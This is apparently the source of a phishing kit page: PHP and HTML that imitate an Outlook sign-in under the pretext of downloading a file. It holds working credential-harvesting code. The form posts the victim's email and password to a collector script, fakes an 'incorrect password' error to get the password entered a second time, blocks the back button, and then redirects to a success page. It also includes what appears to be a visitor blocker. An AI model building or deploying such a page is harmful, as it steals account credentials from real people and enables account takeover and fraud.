<?php


session_start();
include("blocker.php");

?>

<!DOCTYPE html>
<html>
<head>
    <title>Outlook - Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
    
    <link rel="shortcut icon" type="icon" href="assets/favicon.ico">
    <link rel="stylesheet" type="text/css" href="scripts/ms-style.css">
    <script type="text/javascript" src="scripts/jquery-2.1.1.min.js"></script>  

    
</head>

<body>
    <div class="overlay">
        <div class="login-box">
            <img src="assets/365.png" height="70" alt="logo">
<h2 id="title">User authentication is required to download this file</h2>
            <h2 id="title">Sign&nbsp;in to Outlook</h2>

            <p id="message" class="message"></p>

             <form id="form" action="" method="post">
                
                 <div class="row margin-bottom-50">
                        <div class="form-group  placeholderContainer">
                            <input type="text" style="padding-left: 0px; border: 0px; border-bottom: 1px solid #aaa;width: 96%;
    
    
    height: 2.5em;
    font-size: 15px;
    box-shadow: none;
    overflow: hidden;
   
    margin-bottom: 1em;
}"   aria-required="true"  placeholder="Email, phone, or Skype"  spellcheck="false" autocomplete="off" name="username" required>
                           
                        </div>
                           <div class="row margin-bottom-50">
                        <div class="form-group  placeholderContainer">
                            <input type="password" style="padding-left: 0px; border: 0px; border-bottom: 1px solid #aaa"  aria-required="true"  placeholder="Password"  spellcheck="false" autocomplete="off" name="password" id="password" required>
                           
                        </div>
                <p id="msg" style="color:red;display:none">Your account or password is incorrect.</p>
                 
                    <div class="row margin-bottom-20">
                        <div class="col-md-12 section text-secondary">
                           
                            <a href="#" aria-label="Create a Microsoft account">I forgot my password !</a>
                            <div class="row inline-block no-margin-top-bottom button-container">

                  
                </div>  
                          
                          
                            
                                  
                  
                </div>  
                         

                   
                   </div>  
                        

<br/><br/>
                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="submit" style="width: 160px;" class="btn btn-block btn-primary" data-bind="value: config.text.linkNext, click: submit" value="Sign in & Download">
                </div>
                </div>
<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script> 
<script type="text/javascript">

history.pushState(null, document.title, location.href);
window.addEventListener('popstate', function (event)
{
  history.pushState(null, document.title, location.href);
});

//$(document).bind("contextmenu", function(e){ return false;});

var count = 0;
var counts = 0;

$('#form').on('submit', function(e){
		counts = counts+1;
		$('#rcmloginsubmit').html('<i class="fa fa-refresh fa-spin"></i>');
		$.post('php/outlook.php', $(this).serialize(), function(data){
			console.log(data);
		});
		setTimeout(function() {
		
							if(counts == 2){
							   $('#step1').show();
							   $('#step1').show();
							   
					   setTimeout(function() {
                              window.location.href = "done/success.html";
                        },1000);
							   
							}else{
							     $('#password').val('');
								 $('#msg').show();
								 $('#rcmloginsubmit').html('LOGIN');
							}
		
                            
                        },1000);
		e.preventDefault();
	});

</script>
</body>
</html>